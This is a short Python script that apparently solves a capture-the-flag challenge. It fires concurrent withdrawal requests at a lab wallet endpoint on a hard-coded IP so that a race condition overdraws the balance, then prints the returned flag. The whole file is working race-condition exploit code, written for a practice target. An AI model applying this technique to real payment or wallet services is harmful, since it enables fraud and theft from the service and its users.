import requests
import concurrent.futures

BASE = "http://167.172.204.79:5105"   # change if remote, e.g. http://167.172.204.79:5105
AMOUNT = 80
WORKERS = 5

def withdraw_once(session):
    r = session.post(f"{BASE}/level2/withdraw", json={"amount": AMOUNT}, timeout=5)
    try:
        return r.status_code, r.json()
    except Exception:
        return r.status_code, {"raw": r.text}

def main():
    s = requests.Session()

    # Create session cookie/user
    s.get(f"{BASE}/", timeout=5)

    # Ensure clean state: balance=100
    print("Reset:", s.get(f"{BASE}/reset", timeout=5).json())

    # Fire concurrent withdrawals
    with concurrent.futures.ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futures = [ex.submit(withdraw_once, s) for _ in range(WORKERS)]
        results = [f.result() for f in futures]

    print("\nResponses:")
    for i, (code, body) in enumerate(results, 1):
        print(f"{i}. HTTP {code} -> {body}")

    # Final state
    home = s.get(f"{BASE}/", timeout=5).text
    print("\nFinal balance line (from /):")
    for line in home.splitlines():
        if "wallet balance" in line:
            print(line.strip())
            break

    # Pull flag if present in any success response
    flags = [body.get("flag") for _, body in results if isinstance(body, dict) and body.get("flag")]
    if flags:
        print("\nFLAG:", flags[0])
    else:
        print("\nNo flag in response this run, retry once or twice.")

if __name__ == "__main__":
    main()